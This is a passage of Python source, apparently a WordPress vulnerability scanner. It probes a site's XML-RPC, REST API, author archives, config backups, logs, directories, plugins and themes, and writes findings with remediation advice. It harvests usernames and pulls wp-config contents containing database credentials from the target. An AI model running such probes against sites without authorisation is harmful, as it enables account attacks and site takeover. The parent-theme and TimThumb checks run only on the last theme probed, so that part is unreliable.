                    "valid and invalid usernames. Implement rate limiting."
                ),
                http_code=r_lp.status_code,
            )

    # ── 3. XML-RPC ANALYSIS ──────────────────────────────────────────────────
    try:
        _hd = sess.head(base + "/", timeout=wp_timeout, allow_redirects=True)
        xpb = _hd.headers.get("X-Pingback", "")
        if xpb:
            out.add_finding(
                title="WordPress X-Pingback Header Present",
                url=base, port=target["port"], risk="LOW",
                description=(
                    f"The X-Pingback response header ({xpb}) discloses the "
                    "XML-RPC endpoint and confirms XML-RPC is active."
                ),
                output=f"X-Pingback: {xpb}",
                sources="fracture-wordpress", service=target["scheme"],
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation=(
                    "Remove the X-Pingback header and disable XML-RPC if not required."
                ),
            )
    except Exception:
        pass

    r_xmlrpc = _wp_get("/xmlrpc.php")
    if r_xmlrpc and r_xmlrpc.status_code in (200, 405):
        wp_info["xmlrpc"] = True
        _xrq, _xrp = _save_http_evidence(out, phase, f"wp_xmlrpc_{hostname}", r_xmlrpc)
        _xmlrpc_list_payload = (
            '<?xml version="1.0" encoding="iso-8859-1"?>'
            '<methodCall><methodName>system.listMethods</methodName>'
            '<params></params></methodCall>'
        )
        try:
            r_methods = sess.post(
                base + "/xmlrpc.php",
                data=_xmlrpc_list_payload,
                headers={"Content-Type": "text/xml"},
                timeout=wp_timeout,
                allow_redirects=False,
            )
            if r_methods.status_code == 200 and "<methodResponse>" in r_methods.text:
                xmlrpc_methods = re.findall(r'<string>([\w.]+)</string>', r_methods.text)
                _xm_ev = out.output_path(phase, f"wp_xmlrpc_methods_{hostname}")
                _xm_ev.write_text("\n".join(xmlrpc_methods), encoding="utf-8")
                _multicall = "system.multicall" in xmlrpc_methods
                _pingback  = "pingback.ping"    in xmlrpc_methods
                out.add_finding(
                    title="WordPress Vulnerability / Misconfiguration",
                    url=base + "/xmlrpc.php", port=target["port"], risk="HIGH",
                    description="The WordPress installation has one or more security issues including an accessible XML-RPC interface, outdated core/plugins/themes, or other misconfigured features, expanding the attack surface.",
                    output=(
                        f"Methods ({len(xmlrpc_methods)}): "
                        + ", ".join(xmlrpc_methods[:20])
                        + (" ..." if len(xmlrpc_methods) > 20 else "")
                    ),
                    sources="fracture-wordpress", service=target["scheme"],
                    output_file=f"{_xrq},{_xrp},{str(_xm_ev)}",
                    owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                    remediation="Disable the XML-RPC interface unless required; keep WordPress core, plugins, and themes fully updated; remove unused extensions; and restrict administrative interfaces to trusted networks.",
                    http_code=r_xmlrpc.status_code,
                )
                if _multicall:
                    out.add_finding(
                        title="WordPress XML-RPC Multicall Brute-Force Vector",
                        url=base + "/xmlrpc.php", port=target["port"], risk="HIGH",
                        description=(
                            "system.multicall bundles multiple credential-check calls "
                            "in one HTTP request, allowing an attacker to test hundreds "
                            "of username/password pairs while evading per-request rate "
                            "limiting."
                        ),
                        output="system.multicall confirmed via system.listMethods",
                        sources="fracture-wordpress", service=target["scheme"],
                        output_file=str(_xm_ev),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation=(
                            "Disable XML-RPC entirely. If unavoidable, deploy a WAF "
                            "rule blocking multicall bodies."
                        ),
                    )
                if _pingback:
                    out.add_finding(
                        title="WordPress XML-RPC Pingback SSRF Vector",
                        url=base + "/xmlrpc.php", port=target["port"], risk="HIGH",
                        description=(
                            "pingback.ping is exposed, allowing an unauthenticated "
                            "attacker to force the server to make arbitrary outbound "
                            "HTTP requests (SSRF). This can be used to probe internal "
                            "networks, cloud metadata endpoints (169.254.169.254), or "
                            "amplify DDoS attacks against third-party targets."
                        ),
                        output="pingback.ping confirmed via system.listMethods",
                        sources="fracture-wordpress", service=target["scheme"],
                        output_file=str(_xm_ev),
                        owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                        remediation=(
                            "Remove pingback support: add_filter('xmlrpc_methods', "
                            "function($m){ unset($m['pingback.ping']); return $m; }); "
                            "in functions.php, or disable XML-RPC entirely."
                        ),
                    )
        except Exception:
            out.add_finding(
                title="WordPress Vulnerability / Misconfiguration",
                url=base + "/xmlrpc.php", port=target["port"], risk="HIGH",
                description="The WordPress installation has one or more security issues including an accessible XML-RPC interface, outdated core/plugins/themes, or other misconfigured features, expanding the attack surface.",
                output=f"GET /xmlrpc.php → HTTP {r_xmlrpc.status_code}",
                sources="fracture-wordpress", service=target["scheme"],
                output_file=f"{_xrq},{_xrp}",
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation="Disable the XML-RPC interface unless required; keep WordPress core, plugins, and themes fully updated; remove unused extensions; and restrict administrative interfaces to trusted networks.",
                http_code=r_xmlrpc.status_code,
            )

    # ── 4. REST API ENUMERATION ──────────────────────────────────────────────
    r_rest = _wp_get("/wp-json/")
    if r_rest and r_rest.status_code == 200:
        wp_info["rest_api"] = True
        _rest_ev = out.output_path(phase, f"wp_rest_api_{hostname}")
        _rest_ev.write_text(r_rest.text[:10000], encoding="utf-8")
        try:
            _rest_data  = json.loads(r_rest.text)
            _namespaces = _rest_data.get("namespaces", [])
            _ns_str     = ", ".join(_namespaces[:20]) or "unknown"
        except Exception:
            _namespaces = []
            _ns_str     = "unknown"
        out.add_finding(
            title="WordPress REST API Exposed",
            url=base + "/wp-json/", port=target["port"], risk="MEDIUM",
            description=(
                f"The WordPress REST API is publicly accessible, exposing "
                f"{len(_namespaces)} namespace(s): {_ns_str}. "
                "Unauthenticated REST access can leak user accounts, published posts, "
                "media files, and plugin-specific data."
            ),
            output=f"Namespaces: {_ns_str}",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=str(_rest_ev),
            owasp="A01:2025 Broken Access Control", nist="AC-3",
            remediation=(
                "Restrict unauthenticated REST access with an authentication filter. "
                "At minimum, disable the /wp-json/wp/v2/users endpoint."
            ),
            http_code=r_rest.status_code,
        )

    r_rest_users = _wp_get("/wp-json/wp/v2/users?per_page=10")
    if not r_rest_users or r_rest_users.status_code != 200:
        r_rest_users = _wp_get("/wp-json/wp/v2/users")
    if r_rest_users and r_rest_users.status_code == 200:
        try:
            _rest_user_list = json.loads(r_rest_users.text)
            if isinstance(_rest_user_list, list) and _rest_user_list:
                _ru_extracted = [
                    {"id": u.get("id"), "slug": u.get("slug",""),
                     "name": u.get("name","")}
                    for u in _rest_user_list
                ]
                for _ru in _ru_extracted:
                    if _ru["slug"] not in [x.get("slug") for x in wp_info["users"]]:
                        wp_info["users"].append(_ru)
                _ru_ev = out.output_path(phase, f"wp_rest_users_{hostname}")
                _ru_ev.write_text(
                    "\n".join(f"ID:{u['id']} slug:{u['slug']} name:{u['name']}"
                              for u in _ru_extracted),
                    encoding="utf-8",
                )
                _rurq, _rurp = _save_http_evidence(
                    out, phase, f"wp_rest_users_req_{hostname}", r_rest_users)
                out.add_finding(
                    title=f"WordPress Users Exposed via REST API ({len(_ru_extracted)} user(s))",
                    url=base + "/wp-json/wp/v2/users",
                    port=target["port"], risk="HIGH",
                    description=(
                        f"The REST API /wp/v2/users endpoint returned "
                        f"{len(_ru_extracted)} user account(s) without authentication. "
                        "Disclosed usernames enable targeted brute-force, credential "
                        "stuffing, phishing, and social engineering. Users: "
                        + ", ".join(u["slug"] for u in _ru_extracted[:10])
                        + (" ..." if len(_ru_extracted) > 10 else "")
                    ),
                    output="\n".join(
                        f"ID:{u['id']}  slug:{u['slug']}  display:{u['name']}"
                        for u in _ru_extracted[:20]
                    ),
                    sources="fracture-wordpress", service=target["scheme"],
                    output_file=f"{_rurq},{_rurp},{str(_ru_ev)}",
                    owasp="A01:2025 Broken Access Control", nist="AC-3,IA-5",
                    remediation=(
                        "Filter the REST user endpoint: "
                        "add_filter('rest_user_query',function($p,$r){"
                        "if(!current_user_can('list_users'))$p['login__in']=[0];"
                        "return $p;},10,2); "
                        "Or use a plugin such as Perfmatters or WP Hardening."
                    ),
                    http_code=r_rest_users.status_code,
                )
                vc.log(f"[wordpress] REST users: {len(_ru_extracted)}", "SUCCESS")
        except Exception:
            pass

    r_rest_media = _wp_get("/wp-json/wp/v2/media?per_page=10")
    if r_rest_media and r_rest_media.status_code == 200:
        try:
            _media = json.loads(r_rest_media.text)
            if isinstance(_media, list) and _media:
                _m_urls = [m.get("source_url","") for m in _media if m.get("source_url")]
                _mrq, _mrp = _save_http_evidence(out, phase, f"wp_rest_media_{hostname}", r_rest_media)
                out.add_finding(
                    title="WordPress Media Files Enumerable via REST API",
                    url=base + "/wp-json/wp/v2/media",
                    port=target["port"], risk="LOW",
                    description=(
                        f"The REST API /wp/v2/media endpoint lists {len(_media)} "
                        "uploaded file(s) without authentication, potentially exposing "
                        "documents with metadata, private images, or sensitive uploads."
                    ),
                    output="\n".join(_m_urls[:10]),
                    sources="fracture-wordpress", service=target["scheme"],
                    output_file=f"{_mrq},{_mrp}",
                    owasp="A01:2025 Broken Access Control", nist="AC-3",
                    remediation=(
                        "Restrict the media REST endpoint to authenticated users. "
                        "Audit the uploads directory for sensitive files."
                    ),
                    http_code=r_rest_media.status_code,
                )
        except Exception:
            pass

    # ── 5. USER ENUMERATION — AUTHOR ARCHIVES ───────────────────────────────
    _author_users: list = []
    for _uid in range(1, 11):
        try:
            r_au = sess.get(
                base + f"/?author={_uid}", timeout=wp_timeout,
                allow_redirects=True,
            )
            _slug = None
            if r_au.status_code == 200:
                m_au = re.search(r'/author/([^/"?#\s]+)/?', r_au.url)
                if not m_au:
                    m_au = re.search(r'/author/([^/"?#\s]+)/?', r_au.text)
                if m_au:
                    _slug = m_au.group(1).rstrip("/")
            elif r_au.status_code in (301, 302, 307, 308):
                loc = r_au.headers.get("Location", "")
                m_au = re.search(r'/author/([^/"?#\s]+)/?', loc)
                if m_au:
                    _slug = m_au.group(1).rstrip("/")
            if _slug and _slug not in [u.get("slug") for u in _author_users]:
                _author_users.append({"id": _uid, "slug": _slug})
        except Exception:
            continue

    if _author_users:
        for _au in _author_users:
            if _au["slug"] not in [u.get("slug") for u in wp_info["users"]]:
                wp_info["users"].append(_au)
        _au_ev = out.output_path(phase, f"wp_author_users_{hostname}")
        _au_ev.write_text(
            "\n".join(f"ID:{u['id']}  slug:{u['slug']}" for u in _author_users),
            encoding="utf-8",
        )
        out.add_finding(
            title=f"WordPress User Enumeration via Author Archives ({len(_author_users)} user(s))",
            url=base + "/?author=1", port=target["port"], risk="MEDIUM",
            description=(
                f"Author archive pages disclosed {len(_author_users)} username(s) "
                "by iterating /?author=N. "
                "Usernames: " + ", ".join(u["slug"] for u in _author_users) + ". "
                "These feed directly into credential attacks."
            ),
            output="\n".join(f"ID:{u['id']}  slug:{u['slug']}" for u in _author_users),
            sources="fracture-wordpress", service=target["scheme"],
            output_file=str(_au_ev),
            owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
            remediation=(
                "Disable author archives or redirect them: "
                "add_action('template_redirect',function(){"
                "if(is_author()){wp_redirect(home_url());exit;}}); in functions.php."
            ),
        )
        vc.log(f"[wordpress] Author users: {len(_author_users)}", "SUCCESS")

    # oEmbed user disclosure
    try:
        r_oe = sess.get(
            base + f"/wp-json/oembed/1.0/embed?url={base}/&format=json",
            timeout=wp_timeout, allow_redirects=True,
        )
        if r_oe.status_code == 200:
            _oe = json.loads(r_oe.text)
            _oe_au = _oe.get("author_url", "")
            m_oe = re.search(r'/author/([^/"?#\s]+)/?', _oe_au)
            if m_oe:
                _oe_slug = m_oe.group(1)
                if _oe_slug not in [u.get("slug") for u in wp_info["users"]]:
                    wp_info["users"].append(
                        {"id": None, "slug": _oe_slug, "source": "oembed"})
                    out.add_finding(
                        title="WordPress Username Disclosed via oEmbed API",
                        url=base + "/wp-json/oembed/1.0/embed",
                        port=target["port"], risk="LOW",
                        description=(
                            f"The oEmbed API disclosed username '{_oe_slug}' in the "
                            "author_url field without authentication."
                        ),
                        output=f"author_url: {_oe_au}",
                        sources="fracture-wordpress", service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation=(
                            "Filter oEmbed output to remove the author_url field, "
                            "or restrict the oEmbed endpoint to authenticated requests."
                        ),
                        http_code=r_oe.status_code,
                    )
    except Exception:
        pass

    # ── 6. CONFIGURATION & FILE EXPOSURE ────────────────────────────────────
    for _cb in _WP_CONFIG_BACKUPS:
        r = _wp_get(f"/{_cb}")
        if r and r.status_code == 200:
            _cfg_content = bool(re.search(
                r'define\s*\(|DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|'
                r'table_prefix|AUTH_KEY|SECURE_AUTH_KEY',
                r.text, re.I,
            ))
            wp_info["config_backups"].append(_cb)
            _cbrq, _cbrp = _save_http_evidence(
                out, phase, f"wp_cfgbak_{_cb[:25]}_{hostname}", r)
            out.add_finding(
                title=f"WordPress Configuration Backup Exposed: {_cb}",
                url=base + f"/{_cb}", port=target["port"],
                risk="CRITICAL" if _cfg_content else "HIGH",
                description=(
                    f"/{_cb} is publicly accessible"
                    + (" and contains WordPress configuration data including "
                       "database credentials and secret keys."
                       if _cfg_content
                       else " and may contain WordPress configuration data.")
                    + " Exposure of this file allows full database compromise "
                    "and site takeover."
                ),
                output=r.text[:200],
                sources="fracture-wordpress", service=target["scheme"],
                output_file=f"{_cbrq},{_cbrp}",
                owasp="A01:2025 Broken Access Control", nist="AC-3,IA-5",
                remediation=(
                    f"Delete /{_cb} immediately. Configure the web server to "
                    "deny access to *.bak, *.old, *.orig, *.save, and *.swp "
                    "files. Rotate all exposed database credentials and "
                    "WordPress secret keys."
                ),
                http_code=r.status_code,
            )
            vc.log(f"[wordpress] CRITICAL: config backup exposed: {_cb}", "ERROR")

    # Direct wp-config.php source leak (only if PHP isn't being executed)
    r = _wp_get("/wp-config.php")
    if r and r.status_code == 200 and re.search(
            r'DB_NAME|DB_PASSWORD|AUTH_KEY', r.text, re.I):
        _wcrq, _wcrp = _save_http_evidence(out, phase, f"wp_config_src_{hostname}", r)
        out.add_finding(
            title="WordPress wp-config.php Source Code Exposed",
            url=base + "/wp-config.php", port=target["port"], risk="CRITICAL",
            description=(
                "wp-config.php is being served as plain text rather than executed. "
                "The file contains database credentials, authentication keys, and "
                "salts. Full site compromise is trivial with this information."
            ),
            output=r.text[:300],
            sources="fracture-wordpress", service=target["scheme"],
            output_file=f"{_wcrq},{_wcrp}",
            owasp="A01:2025 Broken Access Control", nist="AC-3,IA-5",
            remediation=(
                "Fix PHP configuration so .php files are executed. "
                "Move wp-config.php one directory above the web root. "
                "Rotate all credentials in the file immediately."
            ),
            http_code=r.status_code,
        )

    r = _wp_get("/wp-content/debug.log")
    if r and r.status_code == 200 and len(r.text) > 10:
        wp_info["debug_log"] = True
        _dbrq, _dbrp = _save_http_evidence(out, phase, f"wp_debug_log_{hostname}", r)
        _dl_ev = out.output_path(phase, f"wp_debug_log_content_{hostname}")
        _dl_ev.write_text(r.text[:50000], encoding="utf-8")
        out.add_finding(
            title="WordPress Debug Log Exposed",
            url=base + "/wp-content/debug.log",
            port=target["port"], risk="HIGH",
            description=(
                "wp-content/debug.log is publicly accessible. Debug logs commonly "
                "expose absolute file-system paths, database query details, plugin "
                "and theme error traces, and server configuration — significantly "
                "aiding further attacks."
            ),
            output=r.text[:500],
            sources="fracture-wordpress", service=target["scheme"],
            output_file=f"{_dbrq},{_dbrp},{str(_dl_ev)}",
            owasp="A05:2025 Security Misconfiguration", nist="AU-9",
            remediation=(
                "Set define('WP_DEBUG_LOG', false) or move the log path outside "
                "the web root. Add 'deny from all' in /wp-content/.htaccess. "
                "Delete the existing debug.log."
            ),
            http_code=r.status_code,
        )

    for _el in ("/error_log", "/wp-content/error_log", "/wp-includes/error_log"):
        r = _wp_get(_el)
        if r and r.status_code == 200 and len(r.text) > 20:
            _elrq, _elrp = _save_http_evidence(
                out, phase,
                f"wp_errlog_{_el.strip('/').replace('/', '_')[:30]}_{hostname}", r)
            out.add_finding(
                title=f"PHP Error Log Exposed: {_el}",
                url=base + _el, port=target["port"], risk="MEDIUM",
                description=(
                    f"A PHP error log ({_el}) is publicly accessible, disclosing "
                    "file-system paths, function names, and database query fragments "
                    "that aid targeted attacks."
                ),
                output=r.text[:300],
                sources="fracture-wordpress", service=target["scheme"],
                output_file=f"{_elrq},{_elrp}",
                owasp="A05:2025 Security Misconfiguration", nist="AU-9",
                remediation=(
                    "Disable PHP error logging to web-accessible paths. "
                    "Direct logs to a location outside the document root."
                ),
                http_code=r.status_code,
            )

    # ── 7. DIRECTORY LISTINGS ────────────────────────────────────────────────
    _DL_RE = re.compile(r'Index of /|Directory listing for|<title>Index of', re.I)
    _wp_dirs = {
        "/wp-content/":            "HIGH",
        "/wp-content/uploads/":    "HIGH",
        "/wp-content/plugins/":    "HIGH",
        "/wp-content/themes/":     "MEDIUM",
        "/wp-includes/":           "MEDIUM",
        "/wp-content/mu-plugins/": "HIGH",
    }
    for _dp, _dp_risk in _wp_dirs.items():
        r = _wp_get(_dp)
        if r and r.status_code == 200 and _DL_RE.search(r.text):
            _dpev = out.output_path(
                phase,
                f"wp_dirlist_{_dp.strip('/').replace('/', '_')[:30]}_{hostname}")
            _dpev.write_text(r.text[:5000], encoding="utf-8")
            out.add_finding(
                title=f"WordPress Directory Listing Enabled: {_dp}",
                url=base + _dp, port=target["port"], risk=_dp_risk,
                description=(
                    f"Directory listing is enabled for {_dp}, exposing file names, "
                    "plugin/theme names, and uploaded content to unauthenticated users."
                ),
                output=r.text[:300],
                sources="fracture-wordpress", service=target["scheme"],
                output_file=str(_dpev),
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation=(
                    "Add 'Options -Indexes' to .htaccess or the web server "
                    "virtual-host configuration."
                ),
                http_code=r.status_code,
            )

    # ── 8. WP-CRON EXPOSURE ──────────────────────────────────────────────────
    r = _wp_get("/wp-cron.php")
    if r and r.status_code == 200:
        _wpcron_ev = ""
        try:
            _wpcron_rq, _wpcron_rp = _save_http_evidence(
                out, phase, f"wp_cron_{hostname}", r)
            _wpcron_ev = f"{_wpcron_rq},{_wpcron_rp}"
        except Exception:
            pass
        out.add_finding(
            title="WordPress wp-cron.php Publicly Accessible",
            url=base + "/wp-cron.php", port=target["port"], risk="MEDIUM",
            description=(
                "wp-cron.php is accessible to unauthenticated requests. "
                "Repeated requests can trigger all scheduled tasks simultaneously, "
                "causing resource exhaustion and unexpected behaviour such as "
                "mass outbound email delivery."
            ),
            output=f"GET /wp-cron.php → HTTP {r.status_code}",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=_wpcron_ev,
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation=(
                "Add define('DISABLE_WP_CRON', true) to wp-config.php and "
                "schedule 'wp cron event run --due-now' via a system cron job. "
                "Block direct access to wp-cron.php at the web-server level."
            ),
            http_code=r.status_code,
        )

    # ── 9. MULTISITE DETECTION ───────────────────────────────────────────────
    r = _wp_get("/wp-signup.php")
    if r and r.status_code == 200 and "signup" in r.text.lower():
        wp_info["multisite"] = True
        out.add_finding(
            title="WordPress Multisite Installation Detected",
            url=base + "/wp-signup.php", port=target["port"], risk="INFO",
            description=(
                "WordPress Multisite is enabled (/wp-signup.php is accessible). "
                "Multisite installations have a broader attack surface including "
                "network-level administration and per-site configuration."
            ),
            output=f"GET /wp-signup.php → HTTP {r.status_code}",
            sources="fracture-wordpress", service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation=(
                "Restrict /wp-signup.php if public sub-site registration is "
                "not intended. Review network-admin capabilities."
            ),
            http_code=r.status_code,
        )

    # ── 10. SENSITIVE WP PATHS ───────────────────────────────────────────────
    _WP_EXTRA_PATHS = [
        ("/wp-admin/install.php",  "MEDIUM",
         "WordPress installation script is accessible. "
         "If triggered it could allow a full site reset."),
        ("/wp-admin/upgrade.php",  "MEDIUM",
         "WordPress upgrade script is directly accessible."),
        ("/wp-content/backup-db/", "MEDIUM",
         "WordPress backup-db directory is accessible, potentially exposing "
         "database backup files."),
        ("/wp-content/backups/",   "MEDIUM",
         "WordPress backups directory is accessible."),
        ("/.git/config",           "MEDIUM",
         "Git repository configuration is exposed. Use git-dumper to reconstruct "
         "the full source tree, commit history, and any committed secrets."),
        ("/.git/HEAD",             "MEDIUM",
         "Git repository HEAD reference is exposed, confirming .git is inside "
         "the web root."),
    ]
    for _ep, _ep_risk, _ep_desc in _WP_EXTRA_PATHS:
        r = _wp_get(_ep)
        if r and r.status_code == 200:
            _ep_ev = out.output_path(
                phase,
                f"wp_path_{_ep.strip('/').replace('/', '_')[:30]}_{hostname}")
            _ep_ev.write_text(r.text[:5000], encoding="utf-8")
            out.add_finding(
                title=f"Sensitive WordPress Path Accessible: {_ep}",
                url=base + _ep, port=target["port"], risk=_ep_risk,
                description=_ep_desc,
                output=f"GET {_ep} → HTTP {r.status_code}",
                sources="fracture-wordpress", service=target["scheme"],
                output_file=str(_ep_ev),
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                remediation=(
                    f"Restrict access to {_ep} via web server configuration or "
                    "remove the file/directory from the web root."
                ),
                http_code=r.status_code,
            )

    # ── 11. PASSIVE PLUGIN DETECTION ────────────────────────────────────────
    _passive_plugins: set = set()
    if homepage_html:
        for _pp in re.findall(r'/wp-content/plugins/([^/"\']+)/', homepage_html):
            _passive_plugins.add(_pp)
    if _passive_plugins:
        for _ps in sorted(_passive_plugins):
            if not any(x["slug"] == _ps for x in wp_info["plugins"]):
                wp_info["plugins"].append(
                    {"slug": _ps, "version": None,
                     "name": _ps, "source": "passive"})
        _plugins_src_ev = out.output_path(phase, f"wp_plugins_source_{hostname}")
        try:
            _plugins_src_ev.write_text(homepage_html[:100000], encoding="utf-8")
            _plugins_src_path = str(_plugins_src_ev)
        except Exception:
            _plugins_src_path = ""
        out.add_finding(
            title=f"WordPress Plugins Detected in Page Source ({len(_passive_plugins)} plugin(s))",
            url=base, port=target["port"], risk="INFO",
            description=(
                f"{len(_passive_plugins)} WordPress plugin(s) identified passively "
                "from HTML source references: "
                + ", ".join(sorted(_passive_plugins)[:20])
                + (" ..." if len(_passive_plugins) > 20 else "")
                + ". Plugin enumeration enables targeted vulnerability research."
            ),
            output="\n".join(sorted(_passive_plugins)),
            sources="fracture-wordpress", service=target["scheme"],
            output_file=_plugins_src_path,
            owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
            remediation=(
                "Obfuscate plugin asset URLs to prevent passive enumeration. "
                "Ensure all detected plugins are on their latest version."
            ),
        )

    # ── 12. ACTIVE PLUGIN ENUMERATION ───────────────────────────────────────
    _slugs_to_probe = (
        sorted(_passive_plugins)
        + [s for s in _WP_PLUGIN_SLUGS if s not in _passive_plugins]
    )
    for _slug in _slugs_to_probe:
        _rm_path = f"/wp-content/plugins/{_slug}/readme.txt"
        r = _wp_get(_rm_path)
        if not (r and r.status_code == 200 and len(r.text) > 20):
            continue
        _p_ver = None
        m_pv = re.search(
            r'(?:Stable\s+tag|Version)\s*:\s*(?!trunk\b)([\d][^\s\r\n,]*)',
            r.text, re.I,
        )
        if m_pv:
            _p_ver = m_pv.group(1).strip()
        m_pn = re.search(r'^===\s*(.+?)\s*===', r.text, re.M)
        _p_name = m_pn.group(1).strip() if m_pn else _slug
        _existing = next((x for x in wp_info["plugins"] if x["slug"] == _slug), None)
        if _existing:
            _existing["version"] = _p_ver
            _existing["name"]    = _p_name
            _existing["source"]  = "active"
        else:
            wp_info["plugins"].append(
                {"slug": _slug, "version": _p_ver,
                 "name": _p_name, "source": "active"})
        _p_ev = out.output_path(phase, f"wp_plugin_{_slug[:30]}_{hostname}")
        _p_ev.write_text(r.text[:5000], encoding="utf-8")
        _ver_str = f" v{_p_ver}" if _p_ver else ""
        out.add_finding(
            title="WordPress Plugin Detected",
            url=base, port=target["port"], risk="INFO",
            description=(
                "WordPress plugin(s) confirmed via readme.txt enumeration. "
                "Version disclosure enables targeted CVE lookups."
            ),
            output=f"Plugin: {_p_name}{_ver_str} | {r.text[:200]}",
            affected=f"{_p_name}{_ver_str} (slug: {_slug})",
            sources="fracture-wordpress", service=target["scheme"],
            output_file=str(_p_ev),
            owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
            remediation=(
                "Keep all WordPress plugins updated to the latest release. "
                "Remove readme.txt from plugin directories on production servers. "
                "Remove unused plugins to reduce attack surface."
            ),
            http_code=r.status_code,
        )
        vc.log(f"[wordpress] Plugin: {_p_name}{_ver_str}", "INFO")

    # ── 13. THEME ENUMERATION ────────────────────────────────────────────────
    _passive_themes: set = set()
    if homepage_html:
        for _pt in re.findall(r'/wp-content/themes/([^/"\']+)/', homepage_html):
            _passive_themes.add(_pt)

    _themes_to_probe = (
        sorted(_passive_themes)
        + [s for s in _WP_THEME_SLUGS if s not in _passive_themes]
    )
    _checked_parents: set = set()
    # Accumulate all detected themes; emit a single combined finding after the loop.
    _detected_themes: list = []   # (name, ver_str, parent_str, ev_path, style_url)
    for _tslug in _themes_to_probe:
        _sc_path = f"/wp-content/themes/{_tslug}/style.css"
        r = _wp_get(_sc_path)
        if not (r and r.status_code == 200):
            continue
        _t_ver    = None
        _t_name   = _tslug
        _t_parent = None
        m_tv  = re.search(r'Version\s*:\s*([\d][^\r\n]*)', r.text, re.I)
        if m_tv:
            _t_ver = m_tv.group(1).strip()
        m_tn  = re.search(r'Theme Name\s*:\s*([^\r\n]+)', r.text, re.I)
        if m_tn:
            _t_name = m_tn.group(1).strip()
        m_tp  = re.search(r'Template\s*:\s*([^\r\n]+)', r.text, re.I)
        if m_tp:
            _t_parent = m_tp.group(1).strip()
        wp_info["themes"].append(
            {"slug": _tslug, "version": _t_ver,
             "name": _t_name, "parent": _t_parent})
        _th_ev = out.output_path(phase, f"wp_theme_{_tslug[:30]}_{hostname}")
        _th_ev.write_text(r.text[:5000], encoding="utf-8")
        _tv_str = f" v{_t_ver}" if _t_ver else ""
        _tp_str = f" (child of: {_t_parent})" if _t_parent else ""
        _detected_themes.append((_t_name, _tv_str, _tp_str, str(_th_ev), base + _sc_path))
        vc.log(f"[wordpress] Theme: {_t_name}{_tv_str}", "INFO")

    # Single combined finding for all detected themes
    if _detected_themes:
        _theme_lines = [
            f"• {_tn}{_tv}{_tp}" for _tn, _tv, _tp, _, _ in _detected_themes
        ]
        _theme_ev = ",".join(_ev for _, _, _, _ev, _ in _detected_themes)
        out.add_finding(
            title="WordPress Theme Detected",
            url=base, port=target["port"], risk="INFO",
            description=(
                f"{len(_detected_themes)} theme(s) detected via style.css. "
                "Version disclosure enables CVE research.\n"
                + "\n".join(_theme_lines)
            ),
            output="\n".join(_theme_lines),
            sources="fracture-wordpress", service=target["scheme"],
            output_file=_theme_ev,
            owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
            remediation=(
                "Keep all installed themes updated. "
                "Restrict access to style.css on production servers. "
                "Remove unused themes."
            ),
        )

        # Parent theme check
        if _t_parent and _t_parent not in _checked_parents and _t_parent != _tslug:
            _checked_parents.add(_t_parent)
            _psc = f"/wp-content/themes/{_t_parent}/style.css"
            r_par = _wp_get(_psc)
            if r_par and r_par.status_code == 200:
                _pt_ver  = None
                _pt_name = _t_parent
                m_ptv = re.search(r'Version\s*:\s*([\d][^\r\n]*)', r_par.text, re.I)
                if m_ptv:
                    _pt_ver = m_ptv.group(1).strip()
                m_ptn = re.search(r'Theme Name\s*:\s*([^\r\n]+)', r_par.text, re.I)
                if m_ptn:
                    _pt_name = m_ptn.group(1).strip()
                _pt_ver_str = f" v{_pt_ver}" if _pt_ver else ""
                out.add_finding(
                    title=f"WordPress Parent Theme Detected: {_pt_name}{_pt_ver_str}",
                    url=base + _psc, port=target["port"], risk="INFO",
                    description=(
                        f"Parent theme '{_pt_name}' (slug: {_t_parent})"
                        f"{_pt_ver_str} detected as parent of '{_t_name}'."
                    ),
                    output=r_par.text[:200],
                    sources="fracture-wordpress", service=target["scheme"],
                    owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
                    remediation=f"Keep parent theme '{_pt_name}' updated.",
                    http_code=r_par.status_code,
                )

        # TimThumb check in this theme
        for _tim_sub in (
            f"/wp-content/themes/{_tslug}/timthumb.php",
            f"/wp-content/themes/{_tslug}/lib/timthumb.php",
            f"/wp-content/themes/{_tslug}/scripts/timthumb.php",
        ):
            r_tim = _wp_get(_tim_sub)
            if r_tim and r_tim.status_code in (200, 500):
                _tv2 = None
                m_tv2 = re.search(r'TimThumb\s+(?:version\s*)?([\d.]+)', r_tim.text, re.I)
                if m_tv2:
                    _tv2 = m_tv2.group(1)
                _tv2_str = f" v{_tv2}" if _tv2 else ""
                out.add_finding(
                    title=f"TimThumb Script Detected: {_t_name}{_tv2_str}",
                    url=base + _tim_sub, port=target["port"], risk="HIGH",
                    description=(
                        f"A TimThumb image-processing script{_tv2_str} was found "
                        f"in theme '{_t_name}'. TimThumb has a long history of "
                        "critical vulnerabilities including remote code execution "
                        "(CVE-2011-4106 and others) in versions below 2.8.14."
                    ),
                    output=f"GET {_tim_sub} → HTTP {r_tim.status_code}",
                    sources="fracture-wordpress", service=target["scheme"],
                    owasp="A06:2025 Vulnerable and Outdated Components", nist="SI-2",
                    remediation=(
                        "Remove timthumb.php from the theme and replace with "
                        "WordPress built-in image processing (wp_get_attachment_image)."
                    ),
                    http_code=r_tim.status_code,
                )
                break  # one hit per theme is enough

    # ── 14. DATABASE BACKUP & EXPORT DETECTION ──────────────────────────────
    _SQL_SIG = re.compile(
        r'(?:DROP|(?:UN)?LOCK|CREATE|ALTER|TRUNCATE)\s+(?:TABLE|DATABASE)\b|'
        r'INSERT\s+INTO\s+`?\w|--\s*MySQL\s+dump|mysqldump\s+',
        re.I,
    )
    for _bkp in _WP_DB_BACKUP_PATHS:
        r = _wp_get(_bkp)
        if r and r.status_code == 200:
